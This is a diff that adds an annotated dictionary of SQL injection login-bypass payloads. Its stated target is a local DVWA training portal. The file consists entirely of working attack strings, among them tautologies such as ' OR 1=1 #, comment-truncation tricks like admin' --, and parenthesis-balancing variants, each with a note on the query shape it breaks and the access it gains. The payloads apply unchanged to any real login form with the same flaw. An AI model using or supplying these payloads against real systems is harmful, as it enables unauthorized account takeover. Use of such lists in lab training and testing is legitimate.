@@ -1,0 +1,44 @@
+# ==============================================================================
+# Authentication Bypass Payloads — Curated Dictionary
+# Target Scope: Local DVWA Login Portal (127.0.0.1:8080/login.php)
+# ==============================================================================
+
+# Context: Classic boolean truth condition terminating query with MySQL hash comment.
+# Expected Result: Evaluates WHERE (username='' OR 1=1) as TRUE, logging in as first account in DB (admin).
+' OR 1=1 #
+
+# Context: Double dash SQL standard comment with trailing space.
+# Expected Result: Bypasses password check by truncating password verification clause.
+' OR 1=1 -- 
+
+# Context: Targeted admin account selection with universal true clause.
+# Expected Result: Forces username to evaluate to 'admin', commenting out password requirement.
+admin' -- 
+
+# Context: Double quote injection context for queries wrapped in double quotes e.g. "$user".
+# Expected Result: Breaks out of double-quote string literal, forces true boolean condition.
+" OR ""="" -- 
+
+# Context: Numeric boolean condition without quotes (e.g. WHERE user_level = $level).
+# Expected Result: Forces integer evaluation to true.
+1 OR 1=1
+
+# Context: Tautology targeting SQL queries using parentheses: WHERE (user='$u' AND pass='$p').
+# Expected Result: Balances opening parenthesis and forces true condition.
+') OR ('1'='1' -- 
+
+# Context: Tautology balancing double parentheses: WHERE ((user='$u') AND (pass='$p')).
+# Expected Result: Balances nested parenthesis group and terminates query.
+')) OR (('1'='1' -- 
+
+# Context: Multi-statement or inline comment termination without hash mark.
+# Expected Result: Uses slash-asterisk C-style comments to neutralize rest of SQL string.
+admin'/*
+
+# Context: Boolean condition with OR logic checking string inequality.
+# Expected Result: Evaluates 'a'!='b' (always true), bypassing authentication filter.
+' OR 'a'!='b' #
+
+# Context: Inline tautology utilizing single-quote concatenation.
+# Expected Result: Closes leading quote, evaluates 1=1, ignores subsequent password check.
+' OR 1=1 LIMIT 1 #
